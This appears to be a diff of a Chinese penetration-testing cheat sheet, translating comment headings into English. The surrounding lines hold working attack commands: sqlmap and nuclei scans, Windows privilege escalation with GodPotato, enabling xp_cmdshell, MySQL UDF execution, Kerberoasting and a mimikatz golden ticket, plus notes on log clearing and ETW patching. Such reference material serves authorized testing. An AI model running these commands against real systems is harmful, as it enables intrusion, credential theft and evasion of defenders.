@@ -194,7 +194,7 @@ sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent
 # SSTI 检测
 sstimap -u "https://target.com/search?q=test"
 
-# Nuclei 批量扫描
+# Nuclei batch scanning
 nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
 ```
 
@@ -300,7 +300,7 @@ whoami /priv | findstr "SeImpersonate"
 # Potato 提权
 .\GodPotato.exe -cmd "cmd /c whoami"
 
-# 自动化检测
+# Automated detection
 .\winPEAS.exe
 ```
 
@@ -336,7 +336,7 @@ EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
 
--- MySQL UDF 提权
+-- MySQL UDF privilege escalation
 CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
 SELECT sys_exec('id');
 
@@ -388,7 +388,7 @@ GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password
 # AS-REP Roasting
 GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1
 
-# 金票据
+# Golden Ticket
 mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
 ```
 
@@ -531,7 +531,7 @@ systemctl enable update.service
 | 网络检测 | 域前置/合法服务隧道 | 混入正常流量 |
 | 日志检测 | ETW Patching/日志清除 | 减少痕迹 |
 
-### 6.2 实用绕过技术
+### 6.2 Practical Evasion Techniques
 
 ```
 1. Shellcode 加载器自定义（不用公开工具）
